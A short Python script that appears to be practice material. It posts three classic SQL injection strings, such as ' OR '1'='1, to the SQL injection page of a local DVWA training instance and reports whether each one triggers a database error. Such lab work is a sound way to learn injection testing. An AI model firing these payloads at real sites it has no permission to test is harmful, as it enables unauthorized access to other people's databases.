import requests

url = "http://localhost/dvwa/vulnerabilities/sqli/"
cookies = {
    'PHPSESSID': 'your_session_id',  # Replace with your actual session ID
    'security': 'low'
}
payloads = ["' OR '1'='1", "' OR '1'='2", "' OR 'x'='x"]

for payload in payloads:
    data = {'id': payload, 'Submit': 'Submit'}
    response = requests.post(url, cookies=cookies, data=data)
    if "Database Error" in response.text:
        print(f"Payload {payload} caused a database error.")
    else:
        print(f"Payload {payload} did not cause an error.")
